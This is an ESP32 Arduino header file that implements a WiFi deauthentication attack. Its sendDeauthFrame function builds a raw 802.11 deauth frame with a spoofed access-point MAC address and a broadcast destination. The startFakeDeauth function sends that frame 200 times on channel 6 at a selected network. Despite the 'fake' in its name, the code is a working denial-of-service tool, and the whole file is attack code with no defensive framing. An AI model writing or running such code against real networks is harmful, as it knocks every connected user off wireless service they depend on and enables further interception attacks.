#ifndef FAKE_DEAUTH_H
#define FAKE_DEAUTH_H

#include <WiFi.h>
#include "esp_wifi.h"
#include "wifi_selector.h"

extern uint8_t selectedBSSID[6];
extern int selectedNetwork;

void sendDeauthFrame(uint8_t *apMac) {
  const uint8_t deauthFrame[] = {
    0xc0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
    0x00, 0x00,
    0x07, 0x00
  };

  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

void startFakeDeauth() {
  Serial.println("[*] Running startFakeDeauth()");
  WiFi.mode(WIFI_AP);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);

  delay(300);

  Serial.println("Starting Deauth...");
  for (int i = 0; i < 200; i++) {
    sendDeauthFrame(bssidList[selectedNetwork]);
    delay(20);
  }

  WiFi.mode(WIFI_OFF);
}

#endif
